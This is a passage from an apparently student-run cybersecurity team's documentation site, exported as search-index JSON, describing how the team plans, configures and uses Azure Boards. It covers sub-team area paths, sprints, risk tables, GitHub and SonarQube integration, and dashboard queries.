prioritize work and meet project goals within a defined timeframe. Backlog A collection of work items (epics, features, user stories, and tasks) that have yet to be completed. The backlog is prioritized during sprint planning, and work items are pulled into the sprint based on priority. Work Item A general term for any unit of work in Azure Boards, including epics, features, user stories, tasks, and bugs. Work items are created, tracked, and completed by the teams. Swimlane A horizontal division on a board that separates work items by categories, such as priority, type, or other criteria. Swimlanes help teams visually organize tasks to focus on specific areas. Burndown Chart A graphical representation of the work remaining in a sprint, showing the progress towards sprint completion. It helps teams track whether they are on pace to finish their tasks. Pull Request A request made in GitHub to review and merge code changes into a repository. Pull requests are linked to work items in Azure Boards to track code reviews and approvals. CI/CD Pipeline The continuous integration and continuous deployment pipeline that automates the process of integrating code changes, running automated tests, and deploying applications. SonarQube A tool integrated with Azure Boards to automate security and code quality checks during development. It flags potential issues in the code, which are then logged as work items for remediation. Nagios An infrastructure monitoring tool integrated with Azure Boards to log system alerts and issues. Sprint Planning The process of reviewing the backlog and assigning work items to an upcoming sprint. Teams prioritize tasks and set sprint goals during these planning sessions. Retrospective A meeting held at the end of a sprint to review the team's performance, identify areas of improvement, and discuss what went well. Action items from retrospectives are often tracked as tasks in Azure Boards. Query A custom search filter in Azure Boards that allows users to display specific work items based on criteria such as priority, assignee, or due date. Queries can be saved and reused to track ongoing work. Dashboard A visual interface in Azure Boards that displays key metrics, such as task completion rates, sprint progress, or incident response status. Dashboards are customizable for different teams and stakeholders.   ","version":"Next","tagName":"h2"},{"title":"Risk Analysis & Assessment","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Risk Assessment","content":"","keywords":"","version":"Next"},{"title":"8. Risk Management and Mitigation​","type":1,"pageTitle":"Risk Analysis & Assessment","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Risk Assessment#8-risk-management-and-mitigation","content":" The following tables outline potential risks associated with the implementation and ongoing use of Azure Boards, along with corresponding mitigation strategies and contingency plans.    ","version":"Next","tagName":"h2"},{"title":"8.1 Technical Risks​","type":1,"pageTitle":"Risk Analysis & Assessment","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Risk Assessment#81-technical-risks","content":" Risk\tDescription\tMitigation Strategy\tContingency PlanIntegration Issues\tChallenges in integrating Azure Boards with existing tools like GitHub, SonarQube, Nagios, and SIEM systems.\tConduct thorough testing of integrations before full implementation. Resolve compatibility issues during testing.\tIdentify alternative tools or processes that can be used if integration fails. Provide training on the use of these alternatives. Data Synchronization Errors\tErrors in real-time synchronization between Azure Boards and integrated tools, leading to delays or inaccuracies.\tImplement data backup and recovery plans. Regularly back up data from Azure Boards and integrated tools.\tEstablish procedures for restoring data quickly in the event of synchronization errors. Continuously monitor synchronization to detect issues early. System Downtime\tUnexpected downtime of Azure Boards or integrated tools, disrupting access to tasks and project timelines.\tPlan and communicate scheduled maintenance windows. Implement data backup strategies to minimize the impact of downtime.\tDevelop an incident response plan for dealing with prolonged downtime, including steps to switch to alternative systems or manual processes.    ","version":"Next","tagName":"h3"},{"title":"8.2 Operational Risks​","type":1,"pageTitle":"Risk Analysis & Assessment","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Risk Assessment#82-operational-risks","content":" Risk\tDescription\tMitigation Strategy\tContingency PlanResistance to Change\tTeam members may resist adopting Azure Boards, hindering full utilization of the platform.\tImplement change management initiatives, including workshops and communication campaigns. Highlight the benefits of the platform.\tIntroduce a gradual rollout to allow teams to adapt incrementally. Provide one-on-one support for those struggling with the transition. Learning Curve\tTeam members may face challenges in learning how to use Azure Boards effectively, leading to delays.\tDevelop targeted training programs tailored to each team's needs. Provide ongoing support during the adoption phase.\tOffer refresher courses and additional resources for team members who need further assistance. Allow extra time for complex tasks during the learning phase. Complex Configuration\tConfiguration of Azure Boards may be more complex and time-consuming than anticipated, delaying the project.\tAllocate sufficient time for configuration in the project plan. Involve technical leads from each team in the configuration process.\tAllow for phased deployment to address issues in stages. Set up dedicated troubleshooting sessions to resolve configuration challenges.    ","version":"Next","tagName":"h3"},{"title":"8.3 Security Risks​","type":1,"pageTitle":"Risk Analysis & Assessment","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Risk Assessment#83-security-risks","content":" Risk\tDescription\tMitigation Strategy\tContingency PlanAccess Control Weaknesses\tInadequate configuration of access controls may result in unauthorized access to sensitive information.\tImplement strict role-based access controls (RBAC). Regularly review and update access permissions.\tRegular audits of access controls to ensure compliance. Immediate remediation steps if unauthorized access is detected, including locking down affected accounts. Data Exposure\tUnintentional exposure of sensitive information, such as credentials, if improperly stored in Azure Boards.\tProvide data sensitivity training to all team members. Establish guidelines for handling and storing sensitive information.\tImplement monitoring to detect improper storage of sensitive data. Immediate corrective actions if data exposure occurs, including alerting affected parties. Compliance Challenges\tEnsuring compliance with industry regulations, particularly Australian data protection and privacy laws.\tWork closely with the GRC team to ensure compliance. Conduct regular audits to verify that Azure Boards meets all regulatory requirements.\tDevelop a compliance incident response plan to address and rectify any violations quickly. Provide documentation to support regulatory audits.    ","version":"Next","tagName":"h3"},{"title":"8.4 Adoption and Usage Risks​","type":1,"pageTitle":"Risk Analysis & Assessment","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Risk Assessment#84-adoption-and-usage-risks","content":" Risk\tDescription\tMitigation Strategy\tContingency PlanInconsistent Usage\tTeams may not consistently use Azure Boards as intended, leading to gaps in task tracking and project visibility.\tDevelop and distribute clear usage guidelines. Conduct regular reviews to ensure adherence to processes.\tSchedule periodic reviews and adjustments to ensure consistent usage. Introduce reinforcement training for teams that show inconsistent usage patterns. Over-Complication of Workflows\tWorkflows may become overly complicated, making it difficult for team members to follow processes efficiently.\tRegularly review and simplify workflows based on feedback. Ensure workflows are aligned with team needs and operational goals.\tImplement a feedback loop to continuously gather input from users and make adjustments. Use pilot testing before implementing major workflow changes. Training and Onboarding Delays\tNew team members may require additional time and resources for training, delaying their ability to contribute.\tEstablish a proactive onboarding process with comprehensive training. Provide ongoing support and mentorship.\tAllow for extended onboarding periods in project planning. Assign mentors to new team members to accelerate their learning and integration into the team.   ","version":"Next","tagName":"h3"},{"title":"Introduction & High Level Summary","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Introduction & High Level Summary","content":"","keywords":"","version":"Next"},{"title":"1. Executive Summary​","type":1,"pageTitle":"Introduction & High Level Summary","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Introduction & High Level Summary#1-executive-summary","content":" The Redback Operations Cyber Security Team is tasked with ensuring the security, compliance, and operational efficiency of the organization's IT infrastructure. To support these goals, the team is implementing Azure Boards as a central platform for managing tasks, tracking workflows, and enhancing collaboration across multiple sub-teams, including SecDevOps, Blue Team, Infrastructure, Red Team, and GRC.  Azure Boards will serve as the foundation for streamlining project management and coordination among these teams. By integrating Azure Boards into the operations of each sub-team, Redback Operations aims to achieve better visibility into project initiatives, more effective management of tasks and deadlines, and improved alignment between teams. This implementation is expected to lead to increased efficiency, reduced operational risks, and a more streamlined approach for project management &amp; operational support.  The project will involve configuring Azure Boards to meet the specific needs of each sub-team, defining workflows and processes that align with their unique responsibilities, and integrating Azure Boards with existing tools and systems where necessary. The goal is to create a unified platform that supports the cybersecurity team's mission while allowing for flexibility and scalability as the company expands under future project initiatives.    ","version":"Next","tagName":"h2"},{"title":"2. Solution Overview​","type":1,"pageTitle":"Introduction & High Level Summary","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Introduction & High Level Summary#2-solution-overview","content":" The scope of this solution covers the implementation of Azure Boards for the Redback Operations Cyber Security Team, focusing on its five main sub-teams: SecDevOps, Blue Team, Infrastructure, Red Team, and GRC. Each team has distinct responsibilities, and Azure Boards will be configured to support these responsibilities effectively.    ","version":"Next","tagName":"h2"},{"title":"2.1 Solution Scope​","type":1,"pageTitle":"Introduction & High Level Summary","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Introduction & High Level Summary#21-solution-scope","content":" The solution scope includes:  Integration with Existing Tools. Setup &amp; Configuration Guides. Team Specific Workflows. Training &amp; Documentation. Best Practice Guidelines.    The Configuration of Azure Boards. Setting up area paths, work item types, boards, and sprints tailored to the needs of each team. This configuration will be designed to facilitate task management, workflow tracking, and project visibility.  The project will not cover the development or modification of external tools, systems, or processes that are not directly related to Azure Boards. Additionally, the solution will not include the implementation of new cybersecurity tools or platforms beyond the integration with existing systems.  2.1.1 Integration with Existing Tools​  While the primary focus is on Azure Boards, the solution will support future integrations with key tools such as GitHub integration for code management &amp; pull request tracking, SonarQube for security testing, and Nagios for system monitoring. These integrations will enhance the capabilities of Azure Boards, enabling seamless workflows across the teams.  2.1.2 Development of Team-Specific Workflows​  Customizing workflows within Azure Boards to align with the operational processes of each team. This includes defining stages for work items, setting up approval processes, and configuring notifications and alerts.  2.1.3 Implementation of Best Practices​  Establishing best practices for using Azure Boards, including guidelines for task creation, prioritization, and sprint management. These practices will help ensure consistent and efficient use of the platform across all teams.  The successful implementation of this solution will result in a fully operational Azure Boards platform tailored to the needs of Redback Operations' Cyber Security Team, with the capability to manage and track all relevant tasks, projects, and workflows. This solution will also simplify the start of trimester onboarding experience for new company members (Junior Students) by consolidating tasks and workflows into a single pane of glass.    ","version":"Next","tagName":"h3"},{"title":"3. Solution Components​","type":1,"pageTitle":"Introduction & High Level Summary","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Introduction & High Level Summary#3-solution-components","content":" The implementation of Azure Boards for the Redback Operations Cyber Security Team involves several key components that will be configured to meet the specific needs of the various sub-teams. This section outlines these components, explaining their purpose and how they will be utilized within the broader solution.    ","version":"Next","tagName":"h2"},{"title":"3.1 Azure Boards​","type":1,"pageTitle":"Introduction & High Level Summary","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Introduction & High Level Summary#31-azure-boards","content":" Azure Boards is the central platform that will be used to manage tasks, track progress, and facilitate collaboration across the SecDevOps, Blue Team, Infrastructure, Red Team, and GRC teams. Azure Boards offers a range of features that will be leveraged to ensure effective project management, including:    3.1.1 Work Items​  Azure Boards supports different types of work items, such as Epics, Features, User Stories, Tasks, and Bugs. These work items will be customized for each team to reflect their specific needs and workflows. For example, the SecDevOps team might use Tasks to track specific security testing activities, while the GRC team might use Features to manage compliance audits.    3.1.2 Boards and Kanban Views​  Each sub-team will have its own board configured within Azure Boards. These boards will provide a visual representation of tasks and their progress, using columns to represent different stages of work (e.g., To Do, In Progress, Done). The Kanban view will help teams manage their workflows efficiently, ensuring that tasks move smoothly from one stage to the next.  3.1.3 Area Paths and Teams​  Area Paths in Azure Boards are used to define the hierarchical structure for organizing work items. Each sub-team within the Redback Operations Cyber Security Team will have its own dedicated area path, allowing them to focus on tasks specific to their responsibilities while keeping work items well-organized and separated from other teams. This structure ensures clear visibility into each team's work without unnecessary clutter, helping maintain focus on relevant tasks.  Each sub-team will be assigned to its corresponding Area Path, which provides them with an isolated view of their tasks and workflows.  3.1.4 Sprints​  Sprints will be used by each team to plan and execute work within specific timeframes. Azure Boards' sprint planning tools will help teams prioritize tasks, allocate resources, and track progress against sprint goals. The sprint backlog will provide a clear view of upcoming work, while the sprint board will track tasks as they move through the workflow.    3.1.5 Queries and Filters​  Azure Boards provides powerful query and filtering capabilities, allowing teams to create custom views of work items based on specific criteria. For example, the Infrastructure team might create a query to track all open patch management tasks, while the Red Team might filter work items by the severity of vulnerabilities identified during testing. These queries can be saved and reused, making it easy to monitor key metrics over time.  3.1.6 Dashboards and Reports​  Dashboards in Azure Boards will provide real-time insights into the progress of tasks and projects across the teams. Customizable widgets can be added to dashboards to display metrics such as task completion rates, sprint progress, and the number of open bugs. Reports generated from Azure Boards will be used to provide stakeholders with detailed updates on project status, team performance, and areas that may require attention.    ","version":"Next","tagName":"h3"},{"title":"3.2 Area Paths and Cyber Security Team Layout​","type":1,"pageTitle":"Introduction & High Level Summary","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Introduction & High Level Summary#32-area-paths-and-cyber-security-team-layout","content":" Area paths in Azure Boards will be configured to represent each sub-team within the Redback Operations Cyber Security Team. This hierarchical structure will allow for clear organization and management of work items, ensuring that each team has a focused view of their responsibilities.  3.2.1 SecDevOps Area Path​  This area path will encompass all work related to continuous integration/continuous deployment (CI/CD) pipelines, security testing, and code reviews. The SecDevOps team's tasks will be tracked and managed within this area path, with specific work items tailored to their processes.  3.2.2 Blue Team Area Path​  The Blue Team's area path will focus on incident response, threat hunting, and vulnerability management. Tasks related to these activities will be organized under this area path, enabling the team to efficiently manage and respond to security threats.  3.2.3 Infrastructure Area Path​  This area path will cover system administration, network management, and infrastructure support tasks. The Infrastructure team will use this area to track maintenance activities, patch management, and the configuration of monitoring tools like Nagios.  3.2.4 Red Team Area Path​  The Red Team's area path will be dedicated to penetration testing, vulnerability assessments, and other offensive security activities. Work items in this area will help the Red Team plan, execute, and document their testing efforts.  3.2.5 GRC Area Path​  The GRC team's area path will include tasks related to compliance audits, risk assessments, and policy development. This area will ensure that the GRC team can manage and track their work effectively, while also collaborating with other teams on cross-functional initiatives.    ","version":"Next","tagName":"h3"},{"title":"3.3 Work Item Types​","type":1,"pageTitle":"Introduction & High Level Summary","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Introduction & High Level Summary#33-work-item-types","content":" Azure Boards supports a variety of work item types and templates that will be customized for each team to reflect their specific workflows. These work item types are based on Agile project management objects. The main work item types that will be used include:  3.3.1 Epics​  Large bodies of work that can be broken down into smaller, more manageable pieces. Epics will be used to represent major projects or initiatives, such as the implementation of a new security framework or a comprehensive vulnerability assessment.  3.3.2 Features​  Represent a segment of work that delivers a specific functionality or value. Features are typically derived from epics and are completed within a few sprints. For example, a feature might represent the deployment of a new monitoring tool or the rollout of a security patch across all servers.  3.3.3 User Stories/Tasks​  The smallest units of work that are actionable and can be completed within a single sprint. User stories or tasks will be used to track specific activities, such as configuring a firewall rule or conducting a code review.  3.3.4 Bugs​  Defects or issues that need to be fixed. Bugs can be identified during testing or normal operations and will be tracked until they are resolved. Bugs will be linked to the appropriate tasks or features to ensure they are addressed promptly.  Each team will have the ability to customize these work item types to fit their specific needs, ensuring that Azure Boards reflects the unique workflows and processes of the Redback Operations Cyber Security Team.    ","version":"Next","tagName":"h3"},{"title":"3.4 Board Configuration​","type":1,"pageTitle":"Introduction & High Level Summary","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Introduction & High Level Summary#34-board-configuration","content":" Boards in Azure Boards will be configured to provide each team with a visual representation of their workflow. These boards will use columns to represent different stages of work, allowing teams to easily track the progress of tasks from start to finish.  3.4.1 Column Setup​  Columns will be customized for each team based on their workflow. The default layout is as shown below:    Swimlanes can be added to boards to further organize tasks by category, priority, or other criteria. For example, the GRC team might use swimlanes to separate compliance audits from risk assessments, while the Red Team might use swimlanes to distinguish between different types of penetration tests. As tasks progress, they will be moved across the board from one column to the next. This visual approach helps teams quickly assess the status of their work and identify any bottlenecks or delays.  The board configuration for each team will be designed to reflect their unique workflows and processes, ensuring that Azure Boards supports their operational needs.    ","version":"Next","tagName":"h3"},{"title":"3.5 Sprints and Iterations​","type":1,"pageTitle":"Introduction & High Level Summary","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Introduction & High Level Summary#35-sprints-and-iterations","content":" Sprints and iterations will be used by each team to plan and execute work within defined timeframes. Azure Boards provides tools for managing sprints, including sprint planning, backlog management, and sprint tracking:  During sprint planning, teams will move tasks from the backlog into the sprint, prioritizing work based on importance and urgency. Sprint goals will be set to ensure that the team remains focused on key objectives. The sprint backlog will provide a clear view of the tasks that need to be completed within the sprint. Teams will use the sprint board to track the progress of these tasks and ensure that they are completed on time. Azure Boards will generate burndown charts to track the team's progress against the sprint goals. These charts will help teams monitor their workload and adjust as needed to stay on track.  Sprints will be an integral part of each team's workflow, helping them manage their work efficiently and deliver results within the required timeframe.   ","version":"Next","tagName":"h3"},{"title":"Technical Use Guide","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Technical Use Guide","content":"","keywords":"","version":"Next"},{"title":"Support​","type":1,"pageTitle":"Technical Use Guide","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Technical Use Guide#support","content":" Have a question or issue you would like help with in Azure DevOps? Contact support. * Support queries will be available in semester 1 of 2025 only.  ","version":"Next","tagName":"h2"},{"title":"Introduction​","type":1,"pageTitle":"Technical Use Guide","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Technical Use Guide#introduction","content":" Azure DevOps (ADO) gives you a lot of technical control through GUI-based configuration and a highly documented API. During this semester (T3 2024) we trialed key technical features for a single team in a project, the SecDevOps team. The following was trialed:  User DashboardsGitHub ConnectionsAPI Calls through GitHub ActionsBasic Queries  The following documentation gives a brief overview of those areas. The main guide is a video playlist available here:Video Walkthrough    ","version":"Next","tagName":"h2"},{"title":"Creating Custom User Dashboards​","type":1,"pageTitle":"Technical Use Guide","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Technical Use Guide#creating-custom-user-dashboards","content":" Below is how the dashboard that we tested turned out. It was designed to fit nicely on devices with screens as small as 13&quot;/14&quot;. It is structured to show the most important information first, and quickly. With the elements not visible until scrolling having less importance, and not being key information sources for project insight.  Dashboard at Login​    Dashboard After Page Scroll​    The widgets on screen are a mix of pre-built ones by Microsoft, such as the work assigned at the top left, and markdown pages such as the task creation templates one below. A burnup chart was chosen for showing progress against project scope as it is better for reducing stress in a team with its focus on progress instead of work to do. If you look at the top right of the screen in the dashboard at login you will se three blocks with colours indicating their state. These colours can be customised by editing the widgets and adding your own &quot;levels of severity&quot;. Note that there is a default colour and that the rules have precedence based on their order from top to bottom.    ","version":"Next","tagName":"h2"},{"title":"Pull Request View​","type":1,"pageTitle":"Technical Use Guide","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Technical Use Guide#pull-request-view","content":" An important part of the dashboard for the DevSecOps (the team that the trial was for) is the pull requests (PR's) view. It is built on a custom query that selects tasks in the current semester that are in the PR's area path. These tasks are automatically created through GitHub actions which is mostly covered in the video walkthrough. The goal of creating the automation and view in the dashboard was to join code reviews and project management into one thing. It means that team leaders can automatically assigned PR's to team members based on repository preferences, then manage their completion. And, team members can ensure that they don't forgot to review any PR's as they are part of their main project management suite.  Pull Request Dashboard View​      ","version":"Next","tagName":"h3"},{"title":"Connecting to GitHub​","type":1,"pageTitle":"Technical Use Guide","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Technical Use Guide#connecting-to-github","content":" Setting up a reference to GitHub is relatively straightforward. To do so follow these steps:  ","version":"Next","tagName":"h2"},{"title":"In GitHub​","type":1,"pageTitle":"Technical Use Guide","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Technical Use Guide#in-github","content":" Go to the repository that you want to connect. Ask your team leader to add you as a &quot;direct access&quot; member. For team leaders, access this through Repository Settings &gt;&gt; Collaborators and teams &gt;&gt; Manage access &gt;&gt; Direct access. Now you need to generate a personal access token (PAT) through your user account settings. Go toSettings &gt;&gt; Developer Settings &gt;&gt; Personal access tokens &gt;&gt; Tokens (classic) &gt;&gt; Generate new token. Make sure that the token has the following, and only the following, permissions: repo admin:repo_hook read:user user:email   ","version":"Next","tagName":"h3"},{"title":"In ADO​","type":1,"pageTitle":"Technical Use Guide","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Technical Use Guide#in-ado","content":" Go to Project Settings &gt;&gt; Boards &gt;&gt; GitHub connections.Click &quot;New connection&quot;Either paste your PAT or import it from a secure password manager.Click Connect.  This will allow you to create new branches for tasks, or link tasks to existing commits, PR's, or branches. Note that this is not related to the &quot;Repos&quot; service in ADO as this can only copy the GitHub repo and then host it separately. As of writing this (January 2025) we are not planning on using this tool for repository hosting.    ","version":"Next","tagName":"h3"},{"title":"API Calls and Github Actions​","type":1,"pageTitle":"Technical Use Guide","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Technical Use Guide#api-calls-and-github-actions","content":" The documentation for the part of the API that we tested is hosted by Postmanhere. We don't go into the API very much aside from that website and a bit in the video walkthrough. It is better to go to Microsoft's official documentation as it is a large API and any small syntax or logic errors can result in a lotof troubleshooting (from experience). Therefore, you should go to thesource.    ","version":"Next","tagName":"h2"},{"title":"Use of Custom Queries​","type":1,"pageTitle":"Technical Use Guide","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Technical Use Guide#use-of-custom-queries","content":" Azure DevOps gives you an easy to use query editor. As pictured below you add fields to check for, a logical operator for comparison, and the value. It is good practice to have the following clause in all queries so that anything in the current semester is returned. More detail is included in the video demonstration.  Changed Date &gt; @Today - 100  Query To Select PR's​     ","version":"Next","tagName":"h2"},{"title":"Setup Guide & Implementation Plan","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Setup Guide & Implementation Plan","content":"","keywords":"","version":"Next"},{"title":"7. Implementation Plan​","type":1,"pageTitle":"Setup Guide & Implementation Plan","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Setup Guide & Implementation Plan#7-implementation-plan","content":" The Implementation Plan outlines the step-by-step process for setting up Azure Boards for future Redback Operations project teams. This plan is designed as a blueprint for designing/creating your own project team, sub-teams, boards and integrations etc.  While this implementation plan is designed for the Redback Cyber Security team, other project teams can follow these instructions and modify the relevant steps for their own purposes.    ","version":"Next","tagName":"h2"},{"title":"Step 1: Initial Setup and Project Creation​","type":1,"pageTitle":"Setup Guide & Implementation Plan","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Setup Guide & Implementation Plan#step-1-initial-setup-and-project-creation","content":" Create the Azure Boards Project: Set up the project named Redback Operations Cyber Security Team. Choose Git for version control and Agile for the work item process. Keep the project visibility Private until the structure and permissions are fully configured. Define Area Paths for Sub-Teams: Create area paths under Project Settings &gt; Areas for: SecDevOps Blue Team Infrastructure Team Red Team GRC Team This ensures tasks are organized and aligned with each team's specific responsibilities. Assign Teams to Area Paths: Create separate teams for each sub-group in Project Settings &gt; Teams. Assign each team to the corresponding area path to give them autonomy in managing their tasks, while maintaining visibility across the organization. Permissions and Access Control: Grant access based on the role and team assignment, ensuring only authorized team members can access their specific areas. Review role-based access control (RBAC) policies to maintain data security and ensure proper task visibility within and across teams.    ","version":"Next","tagName":"h3"},{"title":"Step 2: Configure Boards for Each Sub-Team​","type":1,"pageTitle":"Setup Guide & Implementation Plan","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Setup Guide & Implementation Plan#step-2-configure-boards-for-each-sub-team","content":" Create Custom Boards for Each Team: Configure custom boards for each team to reflect their workflows. Columns to include: To Do, In Progress, Review, and Done. Adjust columns based on team workflows, adding categories like &quot;Testing&quot; or &quot;Waiting for Approval&quot; as needed. Use Swimlanes to Categorize Work Items: SecDevOps: Separate tasks by security testing, code reviews, and pipeline automation. Blue Team: Categorize by incident response priority and threat-hunting activities. Infrastructure: Differentiate between network management, server patching, and user management. Red Team: Split tasks for internal/external pentesting and vulnerability assessments. GRC Team: Organize tasks by compliance audits, risk assessments, and policy development. Visual Workflow Tracking: Ensure each team's board provides a clear visual representation of their work items moving through stages. Use work item rules to automatically transition tasks to the next stage based on completion criteria (e.g., after a code review or security test).    ","version":"Next","tagName":"h3"},{"title":"Step 3: Set Up Work Items and Task Templates​","type":1,"pageTitle":"Setup Guide & Implementation Plan","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Setup Guide & Implementation Plan#step-3-set-up-work-items-and-task-templates","content":" Define Work Item Types: For each team, define custom Epics, Features, User Stories, Tasks, and Bugs. Create work item templates for recurring tasks such as penetration testing, security audits, code reviews, and infrastructure patching. Create Task Templates: Standardize task creation with predefined templates for: SecDevOps: CI/CD pipeline setup, automated code scanning, and deployment validation. Blue Team: Incident response, security alerts, and monitoring. Infrastructure: Firewall configuration, patch deployment, and system monitoring with Nagios. Red Team: Penetration test scheduling, vulnerability documentation, and follow-up tasks for mitigation. GRC Team: Policy drafting, compliance audits, and risk reporting. Assign Priorities and Dependencies: Assign priority levels to tasks based on urgency, with critical tasks marked for immediate attention. Link related work items to reflect dependencies (e.g., a vulnerability task that depends on a successful pentest). Use Automation for Recurring Tasks: Set up automation to create recurring tasks at the start of each sprint, ensuring workflows like security audits or patch cycles are consistently executed.    ","version":"Next","tagName":"h3"},{"title":"Step 4: Sprint Setup and Backlog Management​","type":1,"pageTitle":"Setup Guide & Implementation Plan","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Setup Guide & Implementation Plan#step-4-sprint-setup-and-backlog-management","content":" Configure Iterations (Sprints) for Each Team: Create sprints under Project Settings &gt; Iterations with a typical two-week cycle (e.g., Sprint 1, Sprint 2). Assign these sprints to each sub-team to provide clear timelines and deliverable tracking. Backlog Setup and Prioritization: Organize each team's backlog into Epics, Features, and Tasks. During sprint planning, the team leads will prioritize tasks and move them into the sprint backlog, ensuring alignment with sprint goals. Large tasks (Epics) should be broken into smaller tasks to fit within the sprint timeframe. Track Sprint Progress: Monitor team progress via the sprint board, ensuring that work items move fluidly across stages. Use burndown charts to visualize task completion and remaining workload, adjusting workloads as necessary to avoid sprint overrun. Automated Notifications for Sprint Deadlines: Set up alerts for nearing sprint deadlines or overdue tasks to ensure team members complete work on time and adjust as necessary.    ","version":"Next","tagName":"h3"},{"title":"Step 5: Integration with External Tools​","type":1,"pageTitle":"Setup Guide & Implementation Plan","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Setup Guide & Implementation Plan#step-5-integration-with-external-tools","content":" Integrate GitHub with Azure Boards: For SecDevOps and Red Team, integrate GitHub with Azure Boards to track commits, pull requests, and code reviews directly from the board. Link work items to specific code branches and ensure that pull requests undergo automated security testing. SonarQube Integration (SecDevOps Team): Automate security checks by integrating SonarQube with Azure Boards, allowing results from security scans to be captured as work items for review and remediation. Set up alerts and notifications to track code quality issues automatically. Nagios Integration (Infrastructure Team): Integrate Nagios alerts with Azure Boards so that system incidents (e.g., server downtime or network issues) are automatically created as tasks for the Infrastructure team. SIEM Tool Integration (Blue Team): Integrate SIEM tools with Azure Boards to automate incident creation when security threats are detected. This allows the team to manage and respond to threats in real-time from a central location.    ","version":"Next","tagName":"h3"},{"title":"Step 6: Onboarding Process for New Students​","type":1,"pageTitle":"Setup Guide & Implementation Plan","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Setup Guide & Implementation Plan#step-6-onboarding-process-for-new-students","content":" Create Onboarding Tasks for New Students: Set up an onboarding task list for each new student joining the team. Tasks will include company registration, GitHub access, and reviewing the Azure Boards project. Use the WorkItem Clone tool to replicate these tasks each trimester for new student onboarding. Assign Sub-Team Responsibilities: Based on the team they are joining (SecDevOps, Blue Team, etc.), students will be assigned relevant onboarding tasks and introduced to project documentation. Each student should also review previous sprint goals and completed tasks to familiarize themselves with ongoing work. Onboarding Materials: Provide access to user guides, video tutorials, and team-specific documentation to help new students understand how to use Azure Boards. Mentorship assignments for each student will provide additional guidance during the onboarding period.    ","version":"Next","tagName":"h3"},{"title":"Step 7: Monitoring, Queries, and Reports​","type":1,"pageTitle":"Setup Guide & Implementation Plan","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Setup Guide & Implementation Plan#step-7-monitoring-queries-and-reports","content":" Custom Queries for Each Team: Set up queries to track important work items, such as open tasks, high-priority bugs, or tasks nearing deadlines. For example: Blue Team: Track security incidents by severity. Infrastructure Team: Query open patch management tasks. SecDevOps: View code reviews pending approval or sitting in backlog. Build Dashboards: Create real-time dashboards for each team, displaying metrics such as task completion rates, sprint progress, and backlog health. Customize dashboards to meet the needs of different stakeholders, providing insights into ongoing projects and team performance. Automate Reports: Set up automated reports in Azure Boards to provide weekly or sprint-end summaries for stakeholders. Reports should cover metrics such as: Sprint completion percentages Outstanding incidents or vulnerabilities Security testing results (SecDevOps) Audit and compliance status (GRC Team) Review and Optimize Workflows: Conduct post-sprint retrospectives with each team to review successes and areas for improvement. Document feedback in Azure Boards as actionable items for future sprints.    ","version":"Next","tagName":"h3"},{"title":"Step 8: Final Testing and Support​","type":1,"pageTitle":"Setup Guide & Implementation Plan","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Setup Guide & Implementation Plan#step-8-final-testing-and-support","content":" Pilot Testing with Teams: Before fully rolling out Azure Boards to all sub-teams, conduct a pilot test with one team (e.g., SecDevOps). Gather feedback on the workflow, task tracking, and integrations. Use the results to refine the setup for other teams and make any necessary adjustments to the board configurations, sprint structures, or task templates. Continuous Monitoring: Use Analytics Views to monitor team performance and workload distribution across all sprints. Regularly evaluate the use of Azure Boards to identify areas for improvement, such as optimizing task prioritization or enhancing dashboard functionality.   ","version":"Next","tagName":"h3"},{"title":"Solution Architecture","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Solution Architecture","content":"","keywords":"","version":"Next"},{"title":"4. Solution Architecture​","type":1,"pageTitle":"Solution Architecture","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Solution Architecture#4-solution-architecture","content":" The Solution Architecture section provides a detailed overview of how Azure Boards 